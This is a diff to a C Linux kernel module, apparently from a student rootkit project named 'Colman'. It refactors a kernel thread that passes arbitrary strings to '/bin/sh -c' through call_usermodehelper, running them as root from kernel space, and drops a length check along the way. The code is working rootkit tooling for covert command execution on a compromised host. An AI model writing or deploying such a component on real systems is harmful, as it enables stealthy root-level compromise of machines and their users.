@@ -7,76 +7,54 @@
 #endif
 #include "usermode.h"
 
-#define MAX_CMD_LEN 500
+int run_usermode_cmd(char * cmd);
 
-int run_usermode_cmd(char * cmd, size_t len);
-
-int simple( void *arguments)
+int run_usermode_cmd_thread( void * arguments)
 {
     run_cmd_args * args = (run_cmd_args*)arguments;
-    printk(KERN_INFO "[+] Colman: Init thread.");
+    printk(KERN_INFO "[+] Colman: Init thread.\n");
     while (!kthread_should_stop())
     {
         if (args)
         {
-            //printk(KERN_INFO "[+] Colman: Arg_len = %d.", args->arg_len);
             printk(KERN_INFO "[+] Colman: Simple thread\n");
-            if (args->arg_len && args->arg)
+            if (args->arg)
             {
-                if (run_usermode_cmd(args->arg, args->arg_len) != 0)
+                if (run_usermode_cmd(args->arg) != 0)
                 {
-                    printk(KERN_INFO "[-] Colman: Somthing with the usermode_cmd went wrong.");
+                    printk(KERN_INFO "[-] Colman: Somthing with the usermode_cmd went wrong.\n");
                 }
             }
             else
             {
-                printk(KERN_INFO "[-] Colman: The args are not full.");
+                printk(KERN_INFO "[-] Colman: The args are not full.\n");
             }
         }
         else
         {
-            printk(KERN_INFO "[-] Colman: The args are not full.");
+            printk(KERN_INFO "[-] Colman: The args are not full.\n");
         }
-
+        printk(KERN_INFO "[+] Colman: run_usermode_cmd().\n");
         set_current_state(TASK_INTERRUPTIBLE);
         schedule();
     }
-    printk(KERN_INFO "[+] Colman: Close thread.");
+    printk(KERN_INFO "[+] Colman: Close thread.\n");
     do_exit(0);
 }
 
-int run_usermode_cmd(char * cmd, size_t len)
-{
+int run_usermode_cmd(char * cmd) {
     struct subprocess_info *sub_info;
-    //char final_cmd[MAX_CMD_LEN];
     char * argv[] = { "/bin/sh", "-c", cmd , NULL };
     static char *envp[] = {
         "HOME=/",
         "TERM=linux",
         "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
  
-    //char tmp_output[] = "ls > /home/shahart/colman_rootkit/output";
-    //unsigned int arg_len = strlen(tmp_output);
-
-    if (cmd == NULL || len == 0)
+    if (cmd == NULL)
     {
         printk(KERN_INFO "[-] Colman: Failed to pass arguments.");
         goto exit_with_error;
     }
-    //printk(KERN_INFO "here! len! %d\n", args->arg_len);
-    //run_cmd_args * a = (run_cmd_args *)arguments;
-    
-    
-    //char output_file_cmd[] = " > /home/shahart/colman_rootkit/output";
-    
-    //memcpy(final_cmd, tmp_output, arg_len);
-    //final_cmd[arg_len] = 0x0;
-    
-    //char * final_cmd = kmalloc(sizeof(char) * (strlen(arg) + strlen(output_file_cmd) + 2), GFP_ATOMIC );
-
-    //memcpy(final_cmd, arg, strlen(arg));
-    //memcpy(final_cmd + strlen(arg), output_file_cmd, strlen(output_file_cmd) + 1);
-
 
     printk(KERN_INFO "[+] Colman: command: %s.\n", cmd);
     sub_info = call_usermodehelper_setup( argv[0], argv, envp, GFP_ATOMIC, NULL,NULL,NULL );    
